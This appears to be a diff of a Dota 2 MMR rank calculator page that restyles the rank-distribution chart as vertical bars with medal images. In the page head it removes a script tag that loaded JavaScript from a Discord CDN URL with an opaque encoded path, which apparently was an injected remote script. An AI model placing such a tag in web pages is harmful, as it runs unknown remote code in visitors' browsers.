@@ -246,7 +246,7 @@
             height: 60px;
         }
         
-        /* New distribution graph styles */
+        /* Vertical distribution graph styles */
         .distribution-container {
             margin-top: 40px;
             background-color: rgba(15, 25, 35, 0.8);
@@ -271,45 +271,79 @@
         }
         
         .distribution-graph {
-            margin-top: 20px;
+            display: flex;
+            height: 400px;
+            margin: 30px 0;
+            align-items: flex-end;
+            justify-content: space-around;
+            gap: 10px;
+        }
+        
+        .graph-bar-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100%;
+            width: 100%;
         }
         
         .graph-bar {
-            height: 40px;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            position: relative;
-            border-radius: 4px;
-            overflow: hidden;
+            width: 100%;
             background-color: rgba(26, 62, 111, 0.2);
+            border-radius: 4px 4px 0 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            position: relative;
+            height: 100%;
         }
         
         .graph-bar-fill {
-            height: 100%;
-            display: flex;
-            align-items: center;
-            padding-left: 15px;
-            color: white;
-            font-weight: bold;
-            transition: width 1s ease-out;
-            background: linear-gradient(90deg, var(--dota-blue), #1f4b8e);
+            width: 100%;
+            background: linear-gradient(to top, var(--dota-blue), #1f4b8e);
+            border-radius: 4px 4px 0 0;
+            transition: height 1s ease-out;
+            position: relative;
         }
         
         .graph-bar-label {
-            position: absolute;
-            left: 15px;
             color: white;
             font-weight: bold;
-            z-index: 1;
+            text-align: center;
+            padding: 5px 0;
+            width: 100%;
+            margin-top: 10px;
         }
         
         .graph-bar-percentage {
-            position: absolute;
-            right: 15px;
             color: white;
             font-weight: bold;
-            z-index: 1;
+            text-align: center;
+            padding: 5px 0;
+            position: absolute;
+            top: -25px;
+            width: 100%;
+        }
+        
+        .graph-bar-immortal .graph-bar-fill {
+            background: linear-gradient(to top, #ffcc00, #ff9900);
+        }
+        
+        .graph-bar-immortal .graph-bar-label,
+        .graph-bar-immortal .graph-bar-percentage {
+            color: #ffcc00;
+        }
+        
+        .rank-image-small {
+            width: 40px;
+            height: 40px;
+            object-fit: contain;
+            margin: 5px auto;
+            display: block;
+        }
+        
+        .graph-bar-immortal .rank-image-small {
+            filter: drop-shadow(0 0 5px rgba(255, 204, 0, 0.7));
         }
         
         .distribution-table {
@@ -361,7 +395,7 @@
             font-style: normal;
         }
     </style>
-<script type='text/javascript' src='https://cdn.discordapp.com/j93B7-UO4LltmCbE_-l-yeFAwzBTJwH2L9imSgxmWR4fdM9r96LGrSf6Gl9KtbG8lUTj7C2gXmwSvbxJsKIAkA=='></script></head>
+</head>
 <body>
     <div class="container">
         <h1>Dota 2 MMR Rank Calculator</h1>
@@ -441,7 +475,7 @@
         </table>
     </div>
 
-    <!-- New Distribution Graph Section -->
+    <!-- Distribution Graph Section -->
     <div class="distribution-container">
         <h2 class="distribution-title">Dota 2 Rank Distribution</h2>
         <div class="distribution-subtitle">Based on inflated MMR system (Total players: 6,746,059)</div>
@@ -601,14 +635,14 @@
 
         // Rank distribution data
         const rankDistribution = [
-            { rank: "Herald", percentage: 13.85, players: 934000, mmrRange: "0 – 1214" },
-            { rank: "Guardian", percentage: 26.15, players: 1764000, mmrRange: "1215 – 2429" },
-            { rank: "Crusader", percentage: 25, players: 1686515, mmrRange: "2430 – 3644" },
-            { rank: "Archon", percentage: 22, players: 1484133, mmrRange: "3645 – 4859" },
-            { rank: "Legend", percentage: 5.3, players: 357000, mmrRange: "4860 – 6074" },
-            { rank: "Ancient", percentage: 2.2, players: 148000, mmrRange: "6075 – 7289" },
-            { rank: "Divine", percentage: 1.1, players: 74000, mmrRange: "7290 – 8400" },
-            { rank: "Immortal", percentage: 0.5, players: 33730, mmrRange: "8500+" }
+            { rank: "Herald", percentage: 13.85, players: 934000, mmrRange: "0 – 1214", level: 1 },
+            { rank: "Guardian", percentage: 26.15, players: 1764000, mmrRange: "1215 – 2429", level: 1 },
+            { rank: "Crusader", percentage: 25, players: 1686515, mmrRange: "2430 – 3644", level: 1 },
+            { rank: "Archon", percentage: 22, players: 1484133, mmrRange: "3645 – 4859", level: 1 },
+            { rank: "Legend", percentage: 5.3, players: 357000, mmrRange: "4860 – 6074", level: 1 },
+            { rank: "Ancient", percentage: 2.2, players: 148000, mmrRange: "6075 – 7289", level: 1 },
+            { rank: "Divine", percentage: 1.1, players: 74000, mmrRange: "7290 – 8400", level: 1 },
+            { rank: "Immortal", percentage: 0.5, players: 33730, mmrRange: "8500+", level: 0 }
         ];
 
         // Initialize tables and graph when page loads
@@ -651,31 +685,41 @@
             
             rankDistribution.forEach(item => {
                 const barContainer = document.createElement("div");
-                barContainer.className = "graph-bar";
+                barContainer.className = "graph-bar-container";
+                
+                const bar = document.createElement("div");
+                bar.className = "graph-bar";
+                if (item.rank === "Immortal") {
+                    bar.classList.add("graph-bar-immortal");
+                }
                 
                 const barFill = document.createElement("div");
                 barFill.className = "graph-bar-fill";
-                barFill.style.width = `${item.percentage}%`;
-                
-                const barLabel = document.createElement("div");
-                barLabel.className = "graph-bar-label";
-                barLabel.textContent = item.rank;
+                barFill.style.height = `${item.percentage * 3}px`; // Scale for better visibility
                 
                 const barPercentage = document.createElement("div");
                 barPercentage.className = "graph-bar-percentage";
                 barPercentage.textContent = `${item.percentage}%`;
                 
-                barFill.appendChild(barLabel);
-                barContainer.appendChild(barFill);
-                barContainer.appendChild(barPercentage);
-                graphContainer.appendChild(barContainer);
+                bar.appendChild(barFill);
+                bar.appendChild(barPercentage);
                 
-                // Special styling for Immortal
-                if (item.rank === "Immortal") {
-                    barFill.style.background = "linear-gradient(90deg, #ffcc00, #ff9900)";
-                    barLabel.classList.add("immortal");
-                    barPercentage.classList.add("immortal");
-                }
+                // Add rank label below the bar
+                const barLabel = document.createElement("div");
+                barLabel.className = "graph-bar-label";
+                barLabel.textContent = item.rank;
+                
+                // Add medal image for all ranks
+                const medalImg = document.createElement("img");
+                medalImg.className = "rank-image-small";
+                medalImg.src = getRankImage(item.rank, item.rank === "Immortal" ? 0 : 1);
+                medalImg.alt = `${item.rank} ${item.rank === "Immortal" ? "" : "1"}`;
+                barLabel.appendChild(document.createElement("br"));
+                barLabel.appendChild(medalImg);
+                
+                barContainer.appendChild(bar);
+                barContainer.appendChild(barLabel);
+                graphContainer.appendChild(barContainer);
             });
         }
 
